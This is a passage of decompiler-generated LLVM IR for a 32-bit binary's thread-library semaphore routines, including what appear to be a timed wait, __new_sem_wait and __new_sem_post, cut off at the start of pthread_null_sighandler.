  %stack_var_-60 = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_8057ea0 = load i32, i32* @esi, align 4
  %v0_8057ea1 = load i32, i32* @ebx, align 4
  store i32 %v0_8057ea1, i32* %stack_var_-16, align 4
  %v4_8057ea1 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8057ea5 = call i32 @thread_self.1(i32 %v0_8057ea1, i32 %v0_8057ea0)
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %v2_8057ea5, i32* @edx, align 4
  store i32 %v2_8057ea5, i32* @esi, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_8057eb8 = load i32, i32* %stack_var_-16, align 4
  %v1_8057eb8 = call i32 @__pthread_lock(i32 %v0_8057eb8)
  %v0_8057ebd = load i32, i32* @edi, align 4
  %v1_8057ebd = add i32 %v0_8057ebd, 8
  %v2_8057ebd = inttoptr i32 %v1_8057ebd to i32*
  %v3_8057ebd = load i32, i32* %v2_8057ebd, align 4
  %tmp22 = icmp slt i32 %v3_8057ebd, 1
  br i1 %tmp22, label %dec_label_pc_8057ed5, label %dec_label_pc_8057ec4

dec_label_pc_8057ec4:                             ; preds = %entry
  %v1_8057ec4 = add i32 %v3_8057ebd, -1
  store i32 %v1_8057ec4, i32* %v2_8057ebd, align 4
  %v0_8057ecb = load i32, i32* @edi, align 4
  store i32 %v0_8057ecb, i32* %stack_var_-60, align 4
  %v1_8057ecc = inttoptr i32 %v0_8057ecb to i32*
  %v2_8057ecc = call i32 @__pthread_unlock(i32* %v1_8057ecc)
  br label %dec_label_pc_8057ef5

dec_label_pc_8057ed5:                             ; preds = %entry
  %v0_8057ed5 = load i32, i32* @ebp, align 4
  %v1_8057ed5 = add i32 %v0_8057ed5, 4
  %v2_8057ed5 = inttoptr i32 %v1_8057ed5 to i32*
  %v3_8057ed5 = load i32, i32* %v2_8057ed5, align 4
  %tmp = icmp ult i32 %v3_8057ed5, 1000000000
  br i1 %tmp, label %dec_label_pc_8057efd, label %dec_label_pc_8057ede

dec_label_pc_8057ede:                             ; preds = %dec_label_pc_8057ed5
  store i32 %v0_8057ebd, i32* %stack_var_-60, align 4
  %v1_8057ee2 = inttoptr i32 %v0_8057ebd to i32*
  %v2_8057ee2 = call i32 @__pthread_unlock(i32* %v1_8057ee2)
  %v1_8057ee7 = call i32 @__errno_location(i32 %v0_8057ebd)
  %v1_8057eec = inttoptr i32 %v1_8057ee7 to i32*
  store i32 22, i32* %v1_8057eec, align 4
  br label %dec_label_pc_8057ef5

dec_label_pc_8057ef5:                             ; preds = %dec_label_pc_8057ec4, %dec_label_pc_8057ede
  %storemerge = phi i32 [ -1, %dec_label_pc_8057ede ], [ 0, %dec_label_pc_8057ec4 ]
  br label %dec_label_pc_8057fef

dec_label_pc_8057efd:                             ; preds = %dec_label_pc_8057ed5
  store i32 %v0_8057ebd, i32* %stack_var_-24, align 4
  %v2_8057f01 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8057f01, i32* @edx, align 4
  %v0_8057f05 = load i32, i32* @esi, align 4
  store i32 %v0_8057f05, i32* @eax, align 4
  %v1_8057f0f = add i32 %v0_8057f05, 442
  %v2_8057f0f = inttoptr i32 %v1_8057f0f to i8*
  store i8 0, i8* %v2_8057f0f, align 1
  %v0_8057f16 = load i32, i32* %stack_var_-24, align 4
  %v2_8057f16 = call i32 @__pthread_set_own_extricate_if(i32 %v0_8057f16, i32 134577749)
  %v0_8057f1b = load i32, i32* @esi, align 4
  %v1_8057f1b = add i32 %v0_8057f1b, 66
  %v2_8057f1b = inttoptr i32 %v1_8057f1b to i8*
  %v3_8057f1b = load i8, i8* %v2_8057f1b, align 1
  %v4_8057f1b = icmp eq i8 %v3_8057f1b, 0
  br i1 %v4_8057f1b, label %dec_label_pc_8057f2c, label %dec_label_pc_8057f21

dec_label_pc_8057f21:                             ; preds = %dec_label_pc_8057efd
  %v1_8057f21 = add i32 %v0_8057f1b, 64
  %v2_8057f21 = inttoptr i32 %v1_8057f21 to i8*
  %v3_8057f21 = load i8, i8* %v2_8057f21, align 1
  %v4_8057f21 = icmp eq i8 %v3_8057f21, 0
  store i32 1, i32* @ebx, align 4
  br i1 %v4_8057f21, label %dec_label_pc_8057f38, label %dec_label_pc_8057f2c

dec_label_pc_8057f2c:                             ; preds = %dec_label_pc_8057f21, %dec_label_pc_8057efd
  store i32 %v0_8057f1b, i32* @edx, align 4
  %v0_8057f31 = call i32 @enqueue()
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8057f38

dec_label_pc_8057f38:                             ; preds = %dec_label_pc_8057f21, %dec_label_pc_8057f2c
  %v0_8057f3b = load i32, i32* @edi, align 4
  store i32 %v0_8057f3b, i32* %stack_var_-60, align 4
  %v1_8057f3c = inttoptr i32 %v0_8057f3b to i32*
  %v2_8057f3c = call i32 @__pthread_unlock(i32* %v1_8057f3c)
  %v0_8057f44 = load i32, i32* @ebx, align 4
  %v1_8057f44 = icmp eq i32 %v0_8057f44, 0
  br i1 %v1_8057f44, label %dec_label_pc_8057f53.preheader, label %dec_label_pc_8057f48

dec_label_pc_8057f53.preheader:                   ; preds = %dec_label_pc_8057f38
  %v0_8057f56.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057f53

dec_label_pc_8057f48:                             ; preds = %dec_label_pc_8057f38
  store i32 0, i32* @edx, align 4
  %v0_8057f4a = load i32, i32* @esi, align 4
  store i32 %v0_8057f4a, i32* @eax, align 4
  %v0_8057f4c = load i32, i32* %stack_var_-60, align 4
  %v2_8057f4c = call i32 @__pthread_set_own_extricate_if(i32 %v0_8057f4c, i32 %tmp16)
  br label %dec_label_pc_8057fc6

dec_label_pc_8057f53:                             ; preds = %dec_label_pc_8057fa1, %dec_label_pc_8057f98, %dec_label_pc_8057f53.preheader
  %v0_8057f56 = phi i32 [ %v0_8057f56.pre, %dec_label_pc_8057f53.preheader ], [ %v0_8057f8f, %dec_label_pc_8057f98 ], [ %v0_8057f8f, %dec_label_pc_8057fa1 ]
  %v0_8057f53 = load i32, i32* @ecx, align 4
  %v0_8057f55 = load i32, i32* @ebp, align 4
  store i32 %v0_8057f56, i32* %stack_var_-60, align 4
  %v3_8057f57 = inttoptr i32 %v0_8057f53 to i32*
  %v4_8057f57 = call i32 @__pthread_timedsuspend_new(i32 %v0_8057f56, i32* %v3_8057f57, i32 %v0_8057f53)
  %v1_8057f5f = icmp eq i32 %v4_8057f57, 0
  %v1_8057f61 = icmp eq i1 %v1_8057f5f, false
  br i1 %v1_8057f61, label %dec_label_pc_8057f8f, label %dec_label_pc_8057f63

dec_label_pc_8057f63:                             ; preds = %dec_label_pc_8057f53
  %v0_8057f63 = load i32, i32* @esi, align 4
  store i32 %v0_8057f63, i32* @edx, align 4
  %v0_8057f65 = load i32, i32* @edi, align 4
  store i32 %v0_8057f65, i32* @eax, align 4
  %v0_8057f67 = load i32, i32* %stack_var_-60, align 4
  %v1_8057f67 = call i32 @__pthread_lock(i32 %v0_8057f67)
  %v0_8057f6c = load i32, i32* @esi, align 4
  store i32 %v0_8057f6c, i32* @edx, align 4
  %v0_8057f6e = load i32, i32* @edi, align 4
  %v1_8057f6e = add i32 %v0_8057f6e, 12
  store i32 %v1_8057f6e, i32* @eax, align 4
  %v0_8057f71 = call i32 @remove_from_queue()
  %v0_8057f79 = load i32, i32* @edi, align 4
  store i32 %v0_8057f79, i32* %stack_var_-60, align 4
  store i32 %v0_8057f71, i32* @ebx, align 4
  %v1_8057f7c = inttoptr i32 %v0_8057f79 to i32*
  %v2_8057f7c = call i32 @__pthread_unlock(i32* %v1_8057f7c)
  %v1_8057f84 = icmp eq i32 %v0_8057f71, 0
  %v1_8057f86 = icmp eq i1 %v1_8057f84, false
  br i1 %v1_8057f86, label %dec_label_pc_8057fd4, label %dec_label_pc_8057f88

dec_label_pc_8057f88:                             ; preds = %dec_label_pc_8057f63
  %v0_8057f88 = load i32, i32* @esi, align 4
  store i32 %v0_8057f88, i32* @eax, align 4
  %v0_8057f8a = call i32 @suspend()
  br label %dec_label_pc_8057f8f

dec_label_pc_8057f8f:                             ; preds = %dec_label_pc_8057f53, %dec_label_pc_8057f88
  %v0_8057f8f = load i32, i32* @esi, align 4
  %v1_8057f8f = add i32 %v0_8057f8f, 442
  %v2_8057f8f = inttoptr i32 %v1_8057f8f to i8*
  %v3_8057f8f = load i8, i8* %v2_8057f8f, align 1
  %v4_8057f8f = icmp eq i8 %v3_8057f8f, 0
  %v1_8057f96 = icmp eq i1 %v4_8057f8f, false
  br i1 %v1_8057f96, label %dec_label_pc_8057fa7, label %dec_label_pc_8057f98

dec_label_pc_8057f98:                             ; preds = %dec_label_pc_8057f8f
  %v1_8057f98 = add i32 %v0_8057f8f, 440
  %v2_8057f98 = inttoptr i32 %v1_8057f98 to i8*
  %v3_8057f98 = load i8, i8* %v2_8057f98, align 1
  %v4_8057f98 = icmp eq i8 %v3_8057f98, 0
  br i1 %v4_8057f98, label %dec_label_pc_8057f53, label %dec_label_pc_8057fa1

dec_label_pc_8057fa1:                             ; preds = %dec_label_pc_8057f98
  %v1_8057fa1 = add i32 %v0_8057f8f, 64
  %v2_8057fa1 = inttoptr i32 %v1_8057fa1 to i8*
  %v3_8057fa1 = load i8, i8* %v2_8057fa1, align 1
  %v4_8057fa1 = icmp eq i8 %v3_8057fa1, 0
  %v1_8057fa5 = icmp eq i1 %v4_8057fa1, false
  br i1 %v1_8057fa5, label %dec_label_pc_8057f53, label %dec_label_pc_8057fa7

dec_label_pc_8057fa7:                             ; preds = %dec_label_pc_8057fa1, %dec_label_pc_8057f8f
  store i32 0, i32* @edx, align 4
  store i32 %v0_8057f8f, i32* @eax, align 4
  %v0_8057fab = load i32, i32* %stack_var_-60, align 4
  %v2_8057fab = call i32 @__pthread_set_own_extricate_if(i32 %v0_8057fab, i32 %v0_8057f55)
  %v0_8057fb0 = load i32, i32* @esi, align 4
  %v1_8057fb0 = add i32 %v0_8057fb0, 440
  %v2_8057fb0 = inttoptr i32 %v1_8057fb0 to i8*
  %v3_8057fb0 = load i8, i8* %v2_8057fb0, align 1
  %v4_8057fb0 = icmp eq i8 %v3_8057fb0, 0
  br i1 %v4_8057fb0, label %dec_label_pc_8057fed, label %dec_label_pc_8057fb9

dec_label_pc_8057fb9:                             ; preds = %dec_label_pc_8057fa7
  %v1_8057fb9 = add i32 %v0_8057fb0, 64
  %v2_8057fb9 = inttoptr i32 %v1_8057fb9 to i8*
  %v3_8057fb9 = load i8, i8* %v2_8057fb9, align 1
  %v4_8057fb9 = icmp eq i8 %v3_8057fb9, 0
  %v1_8057fbd = icmp eq i1 %v4_8057fb9, false
  br i1 %v1_8057fbd, label %dec_label_pc_8057fed, label %dec_label_pc_8057fbf

dec_label_pc_8057fbf:                             ; preds = %dec_label_pc_8057fb9
  store i8 0, i8* %v2_8057fb0, align 1
  br label %dec_label_pc_8057fc6

dec_label_pc_8057fc6:                             ; preds = %dec_label_pc_8057f48, %dec_label_pc_8057fbf
  store i32 -1, i32* %stack_var_-60, align 4
  %v2_8057fcf = call i32 @__pthread_do_exit(i32 -1, i32 %v4_8057ea1)
  br label %dec_label_pc_8057fd4

dec_label_pc_8057fd4:                             ; preds = %dec_label_pc_8057f63, %dec_label_pc_8057fc6
  %stack_var_-56.0 = phi i32 [ %v4_8057ea1, %dec_label_pc_8057fc6 ], [ %v0_8057f55, %dec_label_pc_8057f63 ]
  store i32 0, i32* @edx, align 4
  %v0_8057fd6 = load i32, i32* @esi, align 4
  store i32 %v0_8057fd6, i32* @eax, align 4
  %v0_8057fd8 = load i32, i32* %stack_var_-60, align 4
  %v2_8057fd8 = call i32 @__pthread_set_own_extricate_if(i32 %v0_8057fd8, i32 %stack_var_-56.0)
  %v1_8057fdd = call i32 @__errno_location(i32 %v0_8057fd8)
  %v1_8057fe2 = inttoptr i32 %v1_8057fdd to i32*
  store i32 110, i32* %v1_8057fe2, align 4
  br label %dec_label_pc_8057fef

dec_label_pc_8057fed:                             ; preds = %dec_label_pc_8057fb9, %dec_label_pc_8057fa7
  br label %dec_label_pc_8057fef

dec_label_pc_8057fef:                             ; preds = %dec_label_pc_8057fd4, %dec_label_pc_8057ef5, %dec_label_pc_8057fed
  %v0_8057ff6 = phi i32 [ 0, %dec_label_pc_8057fed ], [ -1, %dec_label_pc_8057fd4 ], [ %storemerge, %dec_label_pc_8057ef5 ]
  ret i32 %v0_8057ff6

; uselistorder directives
  uselistorder i32 %v0_8057f8f, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v0_8057f71, { 1, 0 }
  uselistorder i32 %v0_8057f56, { 1, 0 }
  uselistorder i32 %v3_8057ebd, { 1, 0 }
  uselistorder i32 %v0_8057ebd, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-60, { 1, 4, 2, 5, 0, 6, 3, 7, 8, 9 }
  uselistorder i32* %stack_var_-24, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8057fef, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057fd4, { 1, 0 }
  uselistorder label %dec_label_pc_8057fc6, { 1, 0 }
  uselistorder label %dec_label_pc_8057f8f, { 1, 0 }
  uselistorder label %dec_label_pc_8057f38, { 1, 0 }
  uselistorder label %dec_label_pc_8057ef5, { 1, 0 }
}

define i32 @__new_sem_wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8057ff7 = load i32, i32* @esi, align 4
  %v0_8057ff8 = load i32, i32* @ebx, align 4
  store i32 %v0_8057ff8, i32* %stack_var_-8, align 4
  %v4_8057ff8 = ptrtoint i32* %stack_var_-8 to i32
  %v2_8057ffc = call i32 @thread_self.1(i32 %v0_8057ff8, i32 %v0_8057ff7)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %v2_8057ffc, i32* @edx, align 4
  %v1_805801b = call i32 @__pthread_lock(i32 %arg1)
  %v0_8058020 = load i32, i32* @ebx, align 4
  %v1_8058020 = add i32 %v0_8058020, 8
  %v2_8058020 = inttoptr i32 %v1_8058020 to i32*
  %v3_8058020 = load i32, i32* %v2_8058020, align 4
  %tmp12 = icmp slt i32 %v3_8058020, 1
  br i1 %tmp12, label %dec_label_pc_805803c, label %dec_label_pc_8058027

dec_label_pc_8058027:                             ; preds = %entry
  %v1_805802a = add i32 %v3_8058020, -1
  store i32 %v1_805802a, i32* %v2_8058020, align 4
  %v0_805802e = load i32, i32* @ebx, align 4
  store i32 %v0_805802e, i32* %stack_var_-44, align 4
  %v1_805802f = inttoptr i32 %v0_805802e to i32*
  %v2_805802f = call i32 @__pthread_unlock(i32* %v1_805802f)
  br label %dec_label_pc_8058100

dec_label_pc_805803c:                             ; preds = %entry
  %v2_8058040 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8058040, i32* @edx, align 4
  %v1_8058044 = add i32 %v2_8057ffc, 442
  %v2_8058044 = inttoptr i32 %v1_8058044 to i8*
  store i8 0, i8* %v2_8058044, align 1
  store i32 %v2_8057ffc, i32* @eax, align 4
  %v0_805804f = load i32, i32* %stack_var_-44, align 4
  %v2_805804f = call i32 @__pthread_set_own_extricate_if(i32 %v0_805804f, i32 %tmp8)
  %v1_8058058 = add i32 %v2_8057ffc, 66
  %v2_8058058 = inttoptr i32 %v1_8058058 to i8*
  %v3_8058058 = load i8, i8* %v2_8058058, align 1
  %v4_8058058 = icmp eq i8 %v3_8058058, 0
  br i1 %v4_8058058, label %dec_label_pc_805806d, label %dec_label_pc_805805e

dec_label_pc_805805e:                             ; preds = %dec_label_pc_805803c
  store i32 1, i32* @esi, align 4
  %v1_8058067 = add i32 %v2_8057ffc, 64
  %v2_8058067 = inttoptr i32 %v1_8058067 to i8*
  %v3_8058067 = load i8, i8* %v2_8058067, align 1
  %v4_8058067 = icmp eq i8 %v3_8058067, 0
  br i1 %v4_8058067, label %dec_label_pc_805807b, label %dec_label_pc_805806d

dec_label_pc_805806d:                             ; preds = %dec_label_pc_805805e, %dec_label_pc_805803c
  store i32 %v2_8057ffc, i32* @edx, align 4
  store i32 0, i32* @esi, align 4
  %v0_8058076 = call i32 @enqueue()
  br label %dec_label_pc_805807b

dec_label_pc_805807b:                             ; preds = %dec_label_pc_805805e, %dec_label_pc_805806d
  %v0_805807e = load i32, i32* @ebx, align 4
  store i32 %v0_805807e, i32* %stack_var_-44, align 4
  %v1_805807f = inttoptr i32 %v0_805807e to i32*
  %v2_805807f = call i32 @__pthread_unlock(i32* %v1_805807f)
  %v0_8058087 = load i32, i32* @esi, align 4
  %v1_8058087 = icmp eq i32 %v0_8058087, 0
  br i1 %v1_8058087, label %dec_label_pc_8058098.preheader, label %dec_label_pc_805808b

dec_label_pc_8058098.preheader:                   ; preds = %dec_label_pc_805807b
  %v1_80580b2 = add i32 %v2_8057ffc, 440
  %v2_80580b2 = inttoptr i32 %v1_80580b2 to i8*
  %v1_80580bf = add i32 %v2_8057ffc, 64
  %v2_80580bf = inttoptr i32 %v1_80580bf to i8*
  store i32 %v2_8057ffc, i32* @eax, align 4
  %v0_805809c13 = call i32 @suspend()
  %v3_80580a514 = load i8, i8* %v2_8058044, align 1
  %v4_80580a515 = icmp eq i8 %v3_80580a514, 0
  %v1_80580ac17 = icmp eq i1 %v4_80580a515, false
  br i1 %v1_80580ac17, label %dec_label_pc_80580c5, label %dec_label_pc_80580ae

dec_label_pc_805808b:                             ; preds = %dec_label_pc_805807b
  store i32 %v2_8057ffc, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_8058091 = load i32, i32* %stack_var_-44, align 4
  %v2_8058091 = call i32 @__pthread_set_own_extricate_if(i32 %v0_8058091, i32 %tmp8)
  br label %dec_label_pc_80580f2

dec_label_pc_80580ae:                             ; preds = %dec_label_pc_8058098.preheader, %dec_label_pc_8058098.backedge
  %v3_80580b2 = load i8, i8* %v2_80580b2, align 1
  %v4_80580b2 = icmp eq i8 %v3_80580b2, 0
  br i1 %v4_80580b2, label %dec_label_pc_8058098.backedge, label %dec_label_pc_80580bb

dec_label_pc_8058098.backedge:                    ; preds = %dec_label_pc_80580ae, %dec_label_pc_80580bb
  store i32 %v2_8057ffc, i32* @eax, align 4
  %v0_805809c = call i32 @suspend()
  %v3_80580a5 = load i8, i8* %v2_8058044, align 1
  %v4_80580a5 = icmp eq i8 %v3_80580a5, 0
  %v1_80580ac = icmp eq i1 %v4_80580a5, false
  br i1 %v1_80580ac, label %dec_label_pc_80580c5, label %dec_label_pc_80580ae

dec_label_pc_80580bb:                             ; preds = %dec_label_pc_80580ae
  %v3_80580bf = load i8, i8* %v2_80580bf, align 1
  %v4_80580bf = icmp eq i8 %v3_80580bf, 0
  %v1_80580c3 = icmp eq i1 %v4_80580bf, false
  br i1 %v1_80580c3, label %dec_label_pc_8058098.backedge, label %dec_label_pc_80580c5

dec_label_pc_80580c5:                             ; preds = %dec_label_pc_8058098.backedge, %dec_label_pc_80580bb, %dec_label_pc_8058098.preheader
  store i32 %v2_8057ffc, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_80580cb = load i32, i32* %stack_var_-44, align 4
  %v2_80580cb = call i32 @__pthread_set_own_extricate_if(i32 %v0_80580cb, i32 %tmp8)
  %v3_80580d4 = load i8, i8* %v2_80580b2, align 1
  %v4_80580d4 = icmp eq i8 %v3_80580d4, 0
  br i1 %v4_80580d4, label %dec_label_pc_8058100, label %dec_label_pc_80580dd

dec_label_pc_80580dd:                             ; preds = %dec_label_pc_80580c5
  %v3_80580e1 = load i8, i8* %v2_80580bf, align 1
  %v4_80580e1 = icmp eq i8 %v3_80580e1, 0
  %v1_80580e5 = icmp eq i1 %v4_80580e1, false
  br i1 %v1_80580e5, label %dec_label_pc_8058100, label %dec_label_pc_80580e7

dec_label_pc_80580e7:                             ; preds = %dec_label_pc_80580dd
  store i8 0, i8* %v2_80580b2, align 1
  br label %dec_label_pc_80580f2

dec_label_pc_80580f2:                             ; preds = %dec_label_pc_805808b, %dec_label_pc_80580e7
  store i32 -1, i32* %stack_var_-44, align 4
  %v2_80580fb = call i32 @__pthread_do_exit(i32 -1, i32 %v4_8057ff8)
  br label %dec_label_pc_8058100

dec_label_pc_8058100:                             ; preds = %dec_label_pc_80580dd, %dec_label_pc_80580c5, %dec_label_pc_8058027, %dec_label_pc_80580f2
  ret i32 0

; uselistorder directives
  uselistorder i8* %v2_80580b2, { 1, 0, 2 }
  uselistorder i8* %v2_8058044, { 1, 0, 2 }
  uselistorder i32 %v3_8058020, { 1, 0 }
  uselistorder i32 %v2_8057ffc, { 5, 6, 2, 0, 3, 4, 7, 1, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 %tmp8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 3, 1, 0, 4, 2, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 ()* @suspend, { 2, 0, 1 }
  uselistorder i32 ()* @enqueue, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8058100, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80580f2, { 1, 0 }
  uselistorder label %dec_label_pc_80580c5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8058098.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_80580ae, { 1, 0 }
  uselistorder label %dec_label_pc_805807b, { 1, 0 }
}

define i32 @__new_sem_post() local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp13, i32* %stack_var_-188, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8058108 = load i32, i32* @esi, align 4
  %v0_8058109 = load i32, i32* @ebx, align 4
  store i32 %v0_8058109, i32* %stack_var_-8, align 4
  %v2_8058110 = call i32 @thread_self.1(i32 %v0_8058109, i32 %v0_8058108)
  store i32 %tmp8, i32* @esi, align 4
  %v1_805811c = add i32 %v2_8058110, 84
  %v2_805811c = inttoptr i32 %v1_805811c to i32*
  %v3_805811c = load i32, i32* %v2_805811c, align 4
  %v4_805811c = icmp eq i32 %v3_805811c, 0
  %v1_8058120 = icmp eq i1 %v4_805811c, false
  br i1 %v1_8058120, label %dec_label_pc_8058199, label %dec_label_pc_8058122

dec_label_pc_8058122:                             ; preds = %entry
  store i32 %v2_8058110, i32* @edx, align 4
  store i32 %tmp8, i32* @eax, align 4
  %v0_8058126 = load i32, i32* %stack_var_-8, align 4
  %v1_8058126 = call i32 @__pthread_lock(i32 %v0_8058126)
  %v0_805812b = load i32, i32* @esi, align 4
  %v1_805812b = add i32 %v0_805812b, 12
  %v2_805812b = inttoptr i32 %v1_805812b to i32*
  %v3_805812b = load i32, i32* %v2_805812b, align 4
  %v4_805812b = icmp eq i32 %v3_805812b, 0
  %v1_805812f = icmp eq i1 %v4_805812b, false
  br i1 %v1_805812f, label %dec_label_pc_805817f, label %dec_label_pc_8058131

dec_label_pc_8058131:                             ; preds = %dec_label_pc_8058122
  %v1_8058131 = add i32 %v0_805812b, 8
  %v2_8058131 = inttoptr i32 %v1_8058131 to i32*
  %v3_8058131 = load i32, i32* %v2_8058131, align 4
  %v9_8058134 = icmp eq i32 %v3_8058131, 2147483647
  %v1_8058139 = icmp eq i1 %v9_8058134, false
  br i1 %v1_8058139, label %dec_label_pc_8058154, label %dec_label_pc_805813b

dec_label_pc_805813b:                             ; preds = %dec_label_pc_8058131
  %v0_805813b = load i32, i32* %stack_var_-8, align 4
  %v1_805813b = call i32 @__errno_location(i32 %v0_805813b)
  %v1_8058143 = inttoptr i32 %v1_805813b to i32*
  store i32 34, i32* %v1_8058143, align 4
  %v0_8058149 = load i32, i32* @esi, align 4
  store i32 %v0_8058149, i32* %stack_var_-188, align 4
  %v1_805814a = inttoptr i32 %v0_8058149 to i32*
  %v2_805814a = call i32 @__pthread_unlock(i32* %v1_805814a)
  br label %dec_label_pc_8058163

dec_label_pc_8058154:                             ; preds = %dec_label_pc_8058131
  %v1_8058154 = add i32 %v3_8058131, 1
  store i32 %v1_8058154, i32* %v2_8058131, align 4
  %v0_805815b = load i32, i32* @esi, align 4
  store i32 %v0_805815b, i32* %stack_var_-188, align 4
  %v1_805815c = inttoptr i32 %v0_805815b to i32*
  %v2_805815c = call i32 @__pthread_unlock(i32* %v1_805815c)
  br label %dec_label_pc_8058163

dec_label_pc_8058163:                             ; preds = %dec_label_pc_8058154, %dec_label_pc_805817f, %dec_label_pc_805813b
  %storemerge = phi i32 [ -1, %dec_label_pc_805813b ], [ 0, %dec_label_pc_805817f ], [ 0, %dec_label_pc_8058154 ]
  br label %dec_label_pc_80581ef

dec_label_pc_805817f:                             ; preds = %dec_label_pc_8058122
  store i32 %v3_805812b, i32* @ebx, align 4
  %v1_8058172 = add i32 %v3_805812b, 8
  %v2_8058172 = inttoptr i32 %v1_8058172 to i32*
  %v3_8058172 = load i32, i32* %v2_8058172, align 4
  store i32 %v3_8058172, i32* %v2_805812b, align 4
  store i32 0, i32* %v2_8058172, align 4
  %v0_8058182.pre = load i32, i32* @esi, align 4
  store i32 %v0_8058182.pre, i32* %stack_var_-188, align 4
  %v1_8058183 = inttoptr i32 %v0_8058182.pre to i32*
  %v2_8058183 = call i32 @__pthread_unlock(i32* %v1_8058183)
  %v1_8058188 = add i32 %v3_805812b, 442
  %v2_8058188 = inttoptr i32 %v1_8058188 to i8*
  store i8 1, i8* %v2_8058188, align 1
  store i32 %v3_805812b, i32* %stack_var_-188, align 4
  %v1_8058192 = call i32 @__pthread_restart_new(i32 %v3_805812b)
  br label %dec_label_pc_8058163

dec_label_pc_8058199:                             ; preds = %entry
  %v0_8058199 = load i32, i32* @global_var_8075304.574, align 4
  %v2_8058199 = icmp slt i32 %v0_8058199, 0
  %v1_80581a0 = icmp eq i1 %v2_8058199, false
  br i1 %v1_80581a0, label %dec_label_pc_80581c7.preheader, label %dec_label_pc_80581a2

dec_label_pc_80581c7.preheader:                   ; preds = %dec_label_pc_80581a2, %dec_label_pc_8058199
  %v2_80581c7 = ptrtoint i32* %stack_var_-156 to i32
  br label %dec_label_pc_80581c7

dec_label_pc_80581a2:                             ; preds = %dec_label_pc_8058199
  %v1_80581a2 = call i32 @__pthread_initialize_manager(i32 %tmp13)
  %v2_80581a7 = icmp slt i32 %v1_80581a2, 0
  %v1_80581a9 = icmp eq i1 %v2_80581a7, false
  br i1 %v1_80581a9, label %dec_label_pc_80581c7.preheader, label %dec_label_pc_80581ab

dec_label_pc_80581ab:                             ; preds = %dec_label_pc_80581a2
  %v0_80581ab = load i32, i32* %stack_var_-188, align 4
  %v1_80581ab = call i32 @__errno_location(i32 %v0_80581ab)
  %v1_80581b0 = inttoptr i32 %v1_80581ab to i32*
  store i32 11, i32* %v1_80581b0, align 4
  br label %dec_label_pc_80581ef

dec_label_pc_80581c7:                             ; preds = %dec_label_pc_80581c7.preheader, %dec_label_pc_80581e3
  %v0_80581d2 = load i32, i32* @global_var_8075304.574, align 4
  store i32 %v0_80581d2, i32* %stack_var_-188, align 4
  %v3_80581d8 = call i32 @__libc_write(i32 %v0_80581d2, i32 %v2_80581c7, i32 148)
  %v8_80581e0 = icmp eq i32 %v3_80581d8, -1
  %v1_80581e1 = icmp eq i1 %v8_80581e0, false
  br i1 %v1_80581e1, label %dec_label_pc_80581ed, label %dec_label_pc_80581e3

dec_label_pc_80581e3:                             ; preds = %dec_label_pc_80581c7
  %v0_80581e3 = load i32, i32* %stack_var_-188, align 4
  %v1_80581e3 = call i32 @__errno_location(i32 %v0_80581e3)
  %v1_80581e8 = inttoptr i32 %v1_80581e3 to i32*
  %v2_80581e8 = load i32, i32* %v1_80581e8, align 4
  %v11_80581e8 = icmp eq i32 %v2_80581e8, 4
  br i1 %v11_80581e8, label %dec_label_pc_80581c7, label %dec_label_pc_80581ed

dec_label_pc_80581ed:                             ; preds = %dec_label_pc_80581e3, %dec_label_pc_80581c7
  br label %dec_label_pc_80581ef

dec_label_pc_80581ef:                             ; preds = %dec_label_pc_80581ab, %dec_label_pc_8058163, %dec_label_pc_80581ed
  %v0_80581f7 = phi i32 [ -1, %dec_label_pc_80581ab ], [ %storemerge, %dec_label_pc_8058163 ], [ 0, %dec_label_pc_80581ed ]
  %v2_80581f5 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80581f5, i32* @ebx, align 4
  store i32 %v0_8058108, i32* @esi, align 4
  ret i32 %v0_80581f7

; uselistorder directives
  uselistorder i32 %v3_8058131, { 1, 0 }
  uselistorder i32 %v3_805812b, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32* %stack_var_-8, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-188, { 1, 3, 2, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32, i32)* @thread_self.1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80581ef, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80581c7, { 1, 0 }
  uselistorder label %dec_label_pc_8058163, { 1, 0, 2 }
}

define i32 @pthread_null_sighandler() local_unnamed_addr {
entry:
